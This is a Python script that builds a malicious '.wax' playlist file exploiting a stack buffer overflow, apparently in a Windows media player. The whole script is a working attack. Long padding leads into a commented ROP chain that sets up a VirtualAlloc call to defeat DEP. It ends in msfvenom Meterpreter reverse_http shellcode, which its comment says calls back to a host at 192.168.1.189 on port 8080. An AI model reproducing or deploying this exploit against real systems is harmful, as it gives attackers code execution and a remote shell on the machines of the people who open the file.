from struct import pack
payloadFile = open("crash.wax","wb")

pad = b"http://"
pad += b"A" * 15000

# Placeholders for VirtualAlloc Call
va  = pack("<L", (0x45454545)) # Dummy VirtualAlloc Address
va  += pack("<L", (0x46464646)) # Shellcode return address
va  += pack("<L", (0x47474747)) # Dummy Shellcode Address
va  += pack("<L", (0x48484848)) # Dummy dwSize
va  += pack("<L", (0x49494949)) # Dummy flAllocationType
va  += pack("<L", (0x50505050)) # Dummy flProtect

pad += b"A" * (2417 - len(va))
pad += va

pad += pack("<L", (0x10032d54)) # EIP.  push esp ; and al, 0x10 ; pop esi ; mov dword [edx], ecx ; ret  ;  (1 found)

pad += b"\x44" * 4 # Need an extra 4 bytes

# Overwrite VirtualAlloc from IAT
pad += pack("<L", (0x10029a6d)) # pop ecx ; mov eax, esi ; pop ecx ; pop esi ; ret  ;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x100329ad)) # pop ebx ; pop ecx ; ret  ;
pad += pack("<L", (0x42424242)) # Dummy below
pad += pack("<L", (0xffffffe0)) # -0x20
pad += pack("<L", (0x1001451e)) # add eax, ecx ; ret  ;
pad += pack("<L", (0x10029930)) # mov edx, eax ; xor eax, eax ; and cl, 0x0000001F ; shl edx, cl ; ret  ;  (1 found) 45454545 is in edx
pad += pack("<L", (0x1003143f)) # pop eax; ret ;
pad += pack("<L", (0x1005d060)) # Dummy VirtualAlloc Address
pad += pack("<L", (0x10027f59)) # mov eax, dword [eax] ; ret  ;
pad += pack("<L", (0x10031e2e)) # mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ; 

# Increment EDX
pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

#Copy EAX and add an offset for shellcode
pad += pack("<L", (0x1002fa6a)) # mov eax, edx ; ret  ;
pad += pack("<L", (0x100329ae)) # pop ecx  ; ret  ; 
pad += pack("<L", (0xfffffde4)) # -0x210
pad += pack("<L", (0x1002c86a)) # sub eax, ecx ; ret  ;


# Copy shellcode address over 46464646 shellcode return address
pad += pack("<L", (0x10031e2e)) # mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ; 
pad += pack("<L", (0x1002fa6a)) # mov eax, edx ; ret  ;


# Increment EDX
pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

# Writing lpAddress over 47474747
pad += pack("<L", (0x100329ae)) # pop ecx  ; ret  ; 
pad += pack("<L", (0xfffffdf4)) # -0x20c
pad += pack("<L", (0x1002c86a)) # sub eax, ecx ; ret  ;
pad += pack("<L", (0x10031e2e)) # mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ; 
pad += pack("<L", (0x1002fa6a)) # mov eax, edx ; ret  ;

# Increment EDX
pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above


# Writing dwsize over 48484848
pad += pack("<L", (0x10031912)) # pop eax; ret;
pad += pack("<L", (0xffffffff)) # -1 value that is negated
pad += pack("<L", (0x1005b5db)) # neg eax; ret;
pad += pack("<L", (0x10031e2e)) # mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ; 
pad += pack("<L", (0x1002fa6a)) # mov eax, edx ; ret  ;

# Increment EDX
pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

# Writing 0x1000 over 49494949
pad += pack("<L", (0x10031912)) # pop eax; ret;
pad += pack("<L", (0x80808080)) # first value to be added
pad += pack("<L", (0x100329ae)) # pop ecx  ; ret  ; 
pad += pack("<L", (0x7f7f8f80)) # secnd value to be added
pad += pack("<L", (0x1001451e)) # add eax, ecx ; ret  ;
pad += pack("<L", (0x10031e2e)) # mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ; 
pad += pack("<L", (0x1002fa6a)) # mov eax, edx ; ret  ;

# Increment EDX
pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

pad += pack("<L", (0x10028fe6)) # inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret;
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above
pad += pack("<L", (0x42424242)) # Dummy above

# Writing 0x40 over 50505050
pad += pack("<L", (0x10031912)) # pop eax; ret;
pad += pack("<L", (0x80808080)) # first value to be added
pad += pack("<L", (0x100329ae)) # pop ecx  ; ret  ; 
pad += pack("<L", (0x7f7f7fc0)) # secnd value to be added
pad += pack("<L", (0x1001451e)) # add eax, ecx ; ret  ;
pad += pack("<L", (0x10031e2e)) # mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ; 
pad += pack("<L", (0x1002fa6a)) # mov eax, edx ; ret  ;

# Calling VirtualAlloc
pad += pack("<L", (0x1002fa6a)) # mov eax, edx ; ret  ;
pad += pack("<L", (0x100329ae)) # pop ecx  ; ret  ; 
pad += pack("<L", (0xffffffec)) # negative offset value
pad += pack("<L", (0x1001451e)) # add eax, ecx ; ret  ;
pad += pack("<L", (0x1002fe81)) # xchg eax, esp ; ret  ; 

# Padding for payload
pad += b"\x90" * 16

#msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.189 LPORT=8080 -b "\x0a\x00" -f python -v shellcode
shellcode =  b""
shellcode += b"\xdb\xc4\xbd\xa1\xb8\x18\x1f\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x88\x31\x68\x1a\x03\x68\x1a"
shellcode += b"\x83\xe8\xfc\xe2\x54\x44\xf0\x90\x96\xb5\x01"
shellcode += b"\xcf\xa7\x67\x65\x84\x95\xb7\xed\xc8\x15\x33"
shellcode += b"\xa3\xf8\xac\xa6\x4b\xb6\xe4\x0e\xdf\xca\xd0"
shellcode += b"\x7f\x20\x1b\xe0\x2c\xe2\x3d\x9c\x2e\x37\x9e"
shellcode += b"\x9d\xe0\x4a\xdf\xda\xb6\x21\x30\xb6\xc3\x98"
shellcode += b"\xde\xbd\x96\x20\xde\x11\x9d\x19\x98\x14\x62"
shellcode += b"\xce\x2c\x5a\x62\x21\x47\x3a\x44\x4a\x10\xa2"
shellcode += b"\x85\x9f\xf1\x57\x4c\x6b\xce\x1e\x7e\x6b\xa5"
shellcode += b"\x94\x0b\x92\x6c\xe5\xcb\x39\x51\xca\xc1\x40"
shellcode += b"\x95\xec\x39\x37\xed\x0f\xc7\x40\x36\x72\x13"
shellcode += b"\xc4\xa9\xd4\xd0\x7e\x0e\xe5\x35\x18\xc5\xe9"
shellcode += b"\xf2\x6e\x81\xed\x05\xa2\xb9\x09\x8d\x45\x6e"
shellcode += b"\x98\xd5\x61\xaa\xc1\x8e\x08\xeb\xaf\x61\x34"
shellcode += b"\xeb\x17\xdd\x90\x67\xb5\x08\xa4\x87\x46\x35"
shellcode += b"\xf8\x1f\xd6\xaf\x77\xe0\x4e\x47\x11\x8e\xe7"
shellcode += b"\xf3\x89\x02\x80\xdd\x4e\x64\xbb\x13\x8a\xc9"
shellcode += b"\x10\x07\x7f\xbd\x7e\x99\x7f\x41\x7e\xab\x10"
shellcode += b"\x3b\x17\x5f\x83\xda\xc8\xaa\x75\x2d\x36\xfd"
shellcode += b"\xde\x24\x58\x99\x8f\xc1\xd7\x41\x1e\x7a\x37"
shellcode += b"\xb4\xb0\xb3\x0c\x98\x98\xc1\x1b\xbc\x45\x48"
shellcode += b"\xaf\x13\xb1\xba\x7f\x57\x9d\xb0\x09\x9d\xec"
shellcode += b"\x05\xdb\xd1\x27\x46\x4f\x7b\x53\xe3\xaf\x3c"
shellcode += b"\xc6\x88\xc4\xad\x08\x27\x20\x64\x70\x10\xab"
shellcode += b"\x5d\xd1\x0d\x39\x5d\x85\xe2\xd5\xf1\x36\x05"
shellcode += b"\x25\x1a\xb0\x05\x25\xda\x6e\x4c\x5f\xb7\x12"
shellcode += b"\x60\xaa\x73\x99\xcb\xf9\x24\x77\xb5\x64\x97"
shellcode += b"\xce\x2d\x01\x12\xba\x9e\x8c\x29\x0d\xd5\x3a"
shellcode += b"\xbe\x05\x6f\x21\x0e\xaf\xfd\xe3\x58\x3a\x51"
shellcode += b"\xd3\xc3\xf3\x23\x74\x76\xaf\xa5\x4e\xeb\x07"
shellcode += b"\x52\xf6\xde\xd9\xeb\x32\x65\xb2\x98\x76\x11"
shellcode += b"\x7b\x11\xec\x81\x01\xfe\x89\x7f\xbb\x6d\x58"
shellcode += b"\xb0\x70\x2b\xf2\xe3\x41\xff\x49\x4a\xd9\x9a"
shellcode += b"\x22\x1c\x1c\x01\xc4\x96\x26\xba\x70\x95\xbd"
shellcode += b"\x58\x20\x21\x07\xec\xe1\x05\xc5\xa0\x33\xfc"
shellcode += b"\x85\x6d\x58\x4f\x55\xd4\xae\x21\x18\x9e\xa1"
shellcode += b"\xff\xc9\x15\x56\x38\x9d\xc1\xfe\x7d\x61\x42"
shellcode += b"\x96\x2a\xe8\xfd\xa0\x2a\x3f\x88\xea\x86\xa8"
shellcode += b"\x8b\xf0\x40\xad\xdf\xa7\xc3\xfa\x8c\x11\x8c"
shellcode += b"\xef\x66\xb3\x77\x0f\x5d\x5d\xed\xe5\x01\x32"
shellcode += b"\xa1\xaa\xee\xe2\x2d\x60\x17\x12\xd5\x85\xc2"
shellcode += b"\xa7\xe9\x0f\xf9\xcf\x61\xfc\x01\x0f\x1a\x47"
shellcode += b"\xf2\x3a\x3a\xb8\x27\x0b\xcf\xa6\x20\xd9\x2f"
shellcode += b"\x29\xb1\xb7\x6f\x41\xb1\x57\x70\x91\xd9\x57"
shellcode += b"\x70\xd1\x19\x04\x18\x89\xbd\xf9\x3d\xd6\x6b"
shellcode += b"\x6e\xee\x7a\x1d\x77\x46\x15\x1d\x57\x69\xe5"
shellcode += b"\x4e\xc1\x01\xf7\xe6\x64\x33\x08\xd3\xf3\x74"
shellcode += b"\x83\x13\x70\x73\x6d\x6f\x03\xbc\x18\x8a\x53"
shellcode += b"\xfe\xbc\xbc\x1c\xff\xbc\xc2\xd3\xc6\x70\x13"
shellcode += b"\x22\x0f\x4d\x45\x75\x41\x9c\xa1\x4c\x9d\x65"
shellcode += b"\x21\x1b\x3f\xcf\xa8\x63\x13\x0f\xf9"

pad += shellcode

# Buffer for overflow
pad += b"C" * (20000 - len(pad))

payloadFile.write(pad)
payloadFile.close

print ("Payload file created")
